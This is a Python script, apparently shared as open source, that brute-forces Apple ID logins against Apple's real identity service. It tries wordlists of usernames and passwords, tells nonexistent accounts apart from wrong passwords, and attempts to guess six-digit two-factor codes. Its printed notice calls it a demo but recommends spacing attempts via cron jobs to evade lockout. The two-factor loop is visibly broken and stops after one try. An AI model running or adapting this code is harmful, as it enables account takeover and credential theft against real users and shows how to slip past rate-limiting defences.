#!/usr/bin/env python3
# Written by Sem Voigtlander (@userlandkernel)
# Licensed under the MIT License
# Apple if you are monitoring this, please add anti-bot verification to your identity service provider (eg: captcha!)

import os
import sys
import argparse
import requests
import time
import datetime
from bs4 import BeautifulSoup as Soup

class AppleBrutus:

	def __init__(self):

		self.tstart = datetime.datetime.now()

		# Session to keep cookies etc
		self.s = requests.Session()

		# Identity Service provider
		self.ids = "https://idmsa.apple.com/IDMSWebAuth/login?appIdKey=bbddf091a7ff4178d2deda57c73e701096e4cd4b7f97545ed8703b3c46f38461&baseURL=https://portal.apple.com/&path=validateUser%3Faction%3Dlogin%26appId%3D1468%26requestUri"

	def attempt(self, environ="PROD", appleid=None, password=None):
		# Retrieve the login page content
		loginpage = self.s.get(self.ids, allow_redirects=True)

		# If the status isn't HTTP_OK something must be wrong with the application
		if loginpage.status_code != 200:
			raise BaseException("Login page returned error")

		# Find the login
		soup = Soup(loginpage.text, "html.parser")
		form = soup.find("form", {"name":"form2"}) # Login form is named form2

		# Automatically retrieve fields and set post data for requests
		formdata = dict()
		for element in form.find_all("input"):
			try:
				formdata[element["name"]] = element["value"]
			except Exception as exc:
				pass

		# Set the username and password
		if not appleid:
			appleid = str(input("APPLE ID: "))
		if not password:
			password = str(input("PASSWORD: "))

		formdata["appleId"] = appleid
		formdata["accountPassword"] = password

		# Apparently you can log into dev account

		formdata["ENV"] = environ

		# Authenticate with Apple
		print("[{}]: TRYING {}...".format(appleid, password))
		authres = self.s.post("https://idmsa.apple.com/IDMSWebAuth/authenticate", data=formdata, allow_redirects=True)

		# Check if login failed
		if "Your account information was entered incorrectly" in authres.text:
			print("WRONG PASSWORD")
			return 1

		elif "Your Apple ID or password was entered incorrectly" in authres.text:
			print("ACCOUNT DOES NOT EXIST")
			return 2

		# Check if 2FA code is required
		elif "Verify your identity" in authres.text:
			print("PASSWORD FOUND: {}".format(password))
			print("TWO FACTOR")
			# Find form for 2FA code
			soup = Soup(authres.text, "html.parser")
			twofactor = soup.find("form", {"id":"command"}) # 2FA code form has HTML id 'command'

			# Brute force the digits
			for i in range(0, 1000000):
				code = str(i) # Cast to string so we can add prefix of zeroes if needed

				# Add prefix if needed
				while len(code) < 6:
					code = "0"+code
				# Set value of the digit input fields to corresponding digit from bruteforce
				for n in range(0, 5):
					formdata['digit'+str(i+1)] = code[n]

				print("Trying {}".format(code), end=": ")

				# Try 2-FA code
				twofalogin = self.s.post("https://idmsa.apple.com/IDMSWebAuth/"+twofactor['action'], data=formdata, allow_redirects=True)

				if "Unauthorized access detected" in twofalogin.text:
					print("UNAUTHORIZED ACCESS DETECTED")
					break # Just give up, they caught us
				else:
					break
					#print(twofalogin.text)

		elif "This Apple ID has been locked for security reasons" in authres.text:
			print("APPLE ID BLOCKED :(")
			return 2
		else:
			print(authres.text)
			print("SUCCESS")
			return 0


	def brute(self, userfile=None, passfile=None):
		users = None
		passwords = None
		if userfile:
			users = open(userfile, 'r', errors='replace').read().splitlines()
		if passfile:
			passwords = open(passfile, 'r', errors='replace').read().splitlines()

		# Bruteforce
		if users and passwords:
			for user in users:
				if user == "":
					continue
				for password in passwords:
					r = self.attempt(appleid=user, password=password)
					if r == 2:
						print("Skipping {}".format(user))
						break

		# Just regular login
		else:
			self.attempt()
		print("")
		print("BRUTEFORCE COMPLETED IN: {} seconds".format(int((datetime.datetime.now() - self.tstart).total_seconds())))
		print("")


if __name__ == "__main__":

	# Parse arguments
	parser = argparse.ArgumentParser()
	parser.add_argument('userlist', help='Path to wordlist containing usernames to test', nargs='?')
	parser.add_argument('passlist', help='Path to wordlist containing passwords to test e.g: rockyou.txt', nargs='?')
	args = parser.parse_args()

	# Initialize brute forcer
	brutus = AppleBrutus()

	print("NOTICE:")
	print("THIS PROGRAM IS NOT INTENDED FOR HARMFUL PURPOSES AND IS WRITTEN TO DEMO HOW TO CONDUCT A BRUTEFORCE ATTACK")
	print("TRYING MILLIONS OF PASSWORDS LEADS TO BLOCKING THE ACCOUNT")
	print("")
	print("RECOMMENDED STRATEGY: CRON JOB RUNNING EACH FEW HOURS TO TRY FEW PASSWORDS EVERY DAY PER ACCOUNT")
	print("ONLINE ATTACKS OFTEN REQUIRE THIS APPROACH!!!")
	print("")
	print("APPLE ACCOUNTS MAY BE ROTECTED WITH 2FA")
	print("THE SCRIPT SUPPORTS 2FA BRUTEFORCE BUT IT IS NOT EFFECTIVE, FOR DEMO ONLY")
	print("")
	print("TIM COOK, IF U READ THIS: PLEASE ADD CAPTCHA!!!")
	print("")
	print("Initiating bruteforce............")
	# Conduct bruteforce
	brutus.brute(userfile=args.userlist, passfile=args.passlist)
